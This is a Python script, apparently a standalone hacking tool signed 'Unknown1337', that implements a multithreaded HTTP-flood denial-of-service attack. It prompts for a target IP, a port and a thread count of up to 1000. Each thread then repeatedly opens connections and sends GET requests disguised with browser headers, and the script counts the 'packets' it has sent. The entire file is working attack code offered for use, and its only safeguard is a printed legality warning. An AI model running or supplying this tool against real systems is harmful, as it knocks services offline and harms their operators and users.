import socket
import threading
import time
from colorama import Fore, init

init(autoreset=True)

class DDoSTool:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.attack_num = 0
        self.running = False
        self.headers = [
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept-Language: en-US,en;q=0.9",
            "Connection: keep-alive"
        ]

    def attack(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((self.target, self.port))

                # Membuat payload HTTP yang lebih realistis
                request = f"GET /?{self.attack_num} HTTP/1.1\r\n"
                request += "\r\n".join(self.headers) + "\r\n\r\n"

                s.send(request.encode())
                s.close()
                self.attack_num += 1
                print(f"{Fore.GREEN}[+] Packet {self.attack_num} sent to {self.target}")

            except Exception as e:
                print(f"{Fore.RED}[-] Error: {str(e)}")
                time.sleep(0.1)

    def run(self):
        print(f"\n{Fore.YELLOW}[!] WARNING: DDoS attacks are illegal without proper authorization! by Unknown1337")
        self.target = input(f"{Fore.CYAN}[+] Enter target IP: ").strip()
        self.port = int(input(f"{Fore.CYAN}[+] Enter target port (default 80): ") or 80)
        threads = int(input(f"{Fore.CYAN}[+] Enter number of threads (recommended 100-1000): ") or 500)

        self.running = True
        print(f"{Fore.RED}\n[!] Starting DDoS attack on {self.target}:{self.port} (Press Ctrl+C to stop)")

        try:
            # Membuat thread sesuai input pengguna
            for _ in range(threads):
                thread = threading.Thread(target=self.attack)
                thread.daemon = True
                thread.start()

            # Menjaga main thread tetap aktif
            while self.running:
                time.sleep(1)

        except KeyboardInterrupt:
            self.stop()
            print(f"{Fore.RED}\n[!] Attack stopped. Total packets sent: {self.attack_num}")

    def stop(self):
        self.running = False

if __name__ == "__main__":
    tool = DDoSTool()
    tool.run()
